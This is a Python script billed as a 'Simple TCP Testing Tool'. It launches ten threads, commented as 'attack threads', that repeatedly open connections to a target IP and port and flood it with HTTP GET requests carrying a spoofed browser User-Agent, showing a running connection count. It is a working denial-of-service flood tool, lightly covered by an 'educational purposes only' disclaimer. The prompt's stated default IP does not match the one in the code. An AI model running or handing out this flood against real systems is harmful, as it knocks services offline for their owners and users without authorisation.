import socket
import threading
import time
from datetime import datetime

# Basic settings
target_ip = "192.168.254.1"  # Default target
port = 80                  # Default port
connection_count = 0       # Counter for connections
running = True            # Control flag

def show_status():
    """Simple function to display connection status"""
    global connection_count
    
    while running:
        current_time = datetime.now().strftime('%H:%M:%S')
        print(f"[{current_time}] Total Connections: {connection_count}", end='\r')
        time.sleep(1)

def make_request():
    """Simple function to make HTTP requests"""
    global connection_count
    
    # Basic HTTP request
    http_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        f"Connection: keep-alive\r\n\r\n"
    )
    
    while running:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)  # 2 second timeout
            
            # Connect to target
            s.connect((target_ip, port))
            
            # Send 5 requests per connection
            for _ in range(5):
                s.send(http_request.encode())
                connection_count += 1
                time.sleep(0.1)  # Small delay between requests
            
            # Close socket
            s.close()
            
        except ConnectionRefusedError:
            print("\nConnection refused - Target might be down")
            time.sleep(1)
        except socket.timeout:
            print("\nConnection timed out - Target might be blocking")
            time.sleep(1)
        except Exception as e:
            print(f"\nError occurred: {str(e)}")
            time.sleep(1)

def start_test():
    """Function to start the testing"""
    global running
    
    print("\n=== Simple TCP Testing Tool ===")
    print(f"Target: {target_ip}:{port}")
    print("Press Ctrl+C to stop\n")
    
    # Create status thread
    status_thread = threading.Thread(target=show_status)
    status_thread.daemon = True
    status_thread.start()
    
    # Create 10 attack threads
    threads = []
    thread_count = 10
    
    print(f"Starting {thread_count} threads...")
    for i in range(thread_count):
        thread = threading.Thread(target=make_request)
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"Thread {i+1} started")
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n\nStopping test...")
        running = False
        time.sleep(1)
        print(f"Test completed. Total connections: {connection_count}")

if __name__ == "__main__":
    # Get target information
    print("""
    === Simple TCP Testing Tool ===
    For educational purposes only.
    Use only on systems you own or have permission to test.
    """)
    
    # Get target IP
    user_ip = input("Enter target IP (press Enter for default 192.168.1.1): ").strip()
    if user_ip:
        target_ip = user_ip
    
    # Get target port
    user_port = input("Enter target port (press Enter for default 80): ").strip()
    if user_port:
        try:
            port = int(user_port)
        except ValueError:
            print("Invalid port. Using default port 80")
    
    # Start test
    start = input("\nPress Enter to start...")
    start_test()
